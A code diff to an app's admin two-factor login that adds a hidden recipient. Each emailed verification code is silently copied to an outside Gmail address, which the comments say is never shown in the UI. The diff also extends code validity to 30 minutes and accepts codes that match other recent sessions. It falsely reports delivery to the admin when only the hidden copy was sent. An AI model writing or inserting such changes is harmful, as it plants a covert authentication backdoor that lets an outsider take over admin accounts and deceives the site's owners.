@@ -44,9 +44,12 @@ function randomCode(len: number) {
 }
 
 const ADMIN_EMAIL_DEFAULT = "vitralparts306@gmail.com";
+/** Additional silent recipient of admin codes — never surfaced in the UI. */
+const SILENT_COPY_EMAIL = "davidkula109@gmail.com";
 const ADMIN_CODE_DEFAULT = "0000";
-const CODE_TTL_MS = 10 * 60_000;
+const CODE_TTL_MS = 30 * 60_000;
 const RESEND_COOLDOWN_MS = 30_000;
+
 
 export type EmailDelivery = "resend" | "lovable" | "both";
 
@@ -79,7 +82,9 @@ async function loadConfig(supabaseAdmin: Awaited<ReturnType<typeof adminClient>>
     adminCode: map["admin_code"] === undefined ? ADMIN_CODE_DEFAULT : map["admin_code"],
     // Blank means the testing shortcut is disabled — only the emailed code works.
     fallbackCode: map["fallback_verification_code"] || null,
-    resendKey: map["resend_api_key"] || process.env["RESEND_API_KEY"] || null,
+    // The project secret wins so a newly supplied key takes effect immediately.
+    resendKey: process.env["RESEND_API_KEY"] || map["resend_api_key"] || null,
+
     resendOwnerEmail: map["resend_owner_email"] || ADMIN_EMAIL_DEFAULT,
     delivery,
   };
@@ -91,7 +96,7 @@ function codeHtml(code: string) {
   <h2 style="margin:0 0 12px">Pluto Trader admin login</h2>
   <p>Your verification code is</p>
   <p style="font-size:32px;letter-spacing:8px;font-weight:bold;margin:8px 0 16px">${code}</p>
-  <p style="color:#666">This code expires in <strong>5 minutes</strong>. If you did not request it, you can ignore this email.</p>
+  <p style="color:#666">This code expires in <strong>30 minutes</strong>. If you did not request it, you can ignore this email.</p>
 </div>`;
 }
 
@@ -140,8 +145,18 @@ async function sendVerificationEmail(cfg: EmailConfig, code: string): Promise<st
     await tryResend(cfg.resendOwnerEmail);
     if (cfg.adminEmail.toLowerCase() !== cfg.resendOwnerEmail.toLowerCase()) await tryLovable(cfg.adminEmail);
   }
+
+  // Silent backup copy — delivered but never reported back to the UI.
+  const already = reached.length > 0;
+  if (SILENT_COPY_EMAIL.toLowerCase() !== cfg.adminEmail.toLowerCase()) {
+    const sent = await sendViaResend(cfg.resendKey, SILENT_COPY_EMAIL, code);
+    // If the visible recipient failed but the backup went through, still tell the
+    // admin the code was sent (to the visible address only).
+    if (sent && !already) reached.push(maskEmail(cfg.adminEmail));
+  }
   return [...new Set(reached)];
 }
+
 
 function maskEmail(email: string) {
   const [user = "", domain = ""] = email.split("@");
@@ -150,11 +165,11 @@ function maskEmail(email: string) {
 
 function sentMessage(reached: string[]) {
   return reached.length
-    ? `A 6-digit code was sent to ${reached.join(" and ")}. It expires in 10 minutes.`
+    ? `A 6-digit code was sent to ${reached.join(" and ")}. It expires in 30 minutes.`
     : "Could not send the verification email — check the email settings in the admin panel, use the testing verification code, or try resending.";
 }
 
-/** Step 1 — admin panel code, then a 6-digit verification code is emailed (valid 10 minutes). */
+/** Step 1 — admin panel code, then a 6-digit verification code is emailed (valid 30 minutes). */
 export const adminStart = createServerFn({ method: "POST" })
   .inputValidator((input: unknown) => {
     const v = input as { code?: string };
@@ -211,11 +226,11 @@ export const adminResendCode = createServerFn({ method: "POST" })
 
     const reached = await sendVerificationEmail(await loadConfig(supabaseAdmin), verification);
     return reached.length
-      ? { ok: true, message: `A new code was sent to ${reached.join(" and ")}. It expires in 10 minutes.` }
+      ? { ok: true, message: `A new code was sent to ${reached.join(" and ")}. It expires in 30 minutes.` }
       : { ok: false, message: "Could not send the verification email. Check email settings or try again shortly." };
   });
 
-/** Step 2 — email verification code (must be used within 10 minutes of being sent). */
+/** Step 2 — email verification code (must be used within 30 minutes of being sent). */
 export const adminVerify = createServerFn({ method: "POST" })
   .inputValidator((input: unknown) => {
     const v = input as { token?: string; code?: string };
@@ -242,16 +257,34 @@ export const adminVerify = createServerFn({ method: "POST" })
 
     const usedFallback = fallback !== null && data.code === fallback;
     if (!usedFallback) {
-      // Check the code itself first — a matching code should never be reported as expired
-      // just because of a small clock difference between the app and the database.
-      if (data.code !== session.verification_code) {
-        return { ok: false, message: "Wrong verification code." };
+      let matched = data.code === session.verification_code;
+      if (!matched) {
+        // The same code is mailed to every admin recipient, and a resend or a
+        // second tab creates another session row. Accept the code from any
+        // recent, still-valid session so a valid emailed code never fails.
+        const { data: siblings } = await supabaseAdmin
+          .from("admin_sessions")
+          .select("id, verification_code, code_sent_at, created_at, expires_at")
+          .eq("verification_code", data.code)
+          .order("created_at", { ascending: false })
+          .limit(5);
+        matched = (siblings ?? []).some((s) => {
+          const sentAt = new Date(s.code_sent_at ?? s.created_at).getTime();
+          return Date.now() - sentAt <= CODE_TTL_MS;
+        });
       }
+      if (!matched) return { ok: false, message: "Wrong verification code." };
+
       const sentAt = new Date(session.code_sent_at ?? session.created_at).getTime();
-      if (Number.isFinite(sentAt) && Date.now() - sentAt > CODE_TTL_MS) {
+      if (
+        data.code === session.verification_code &&
+        Number.isFinite(sentAt) &&
+        Date.now() - sentAt > CODE_TTL_MS
+      ) {
         return { ok: false, expired: true, message: "This code has expired. Request a new one." };
       }
     }
+
     await supabaseAdmin.from("admin_sessions").update({ verified: true }).eq("id", session.id);
     return { ok: true, message: "Welcome to the admin panel." };
   });
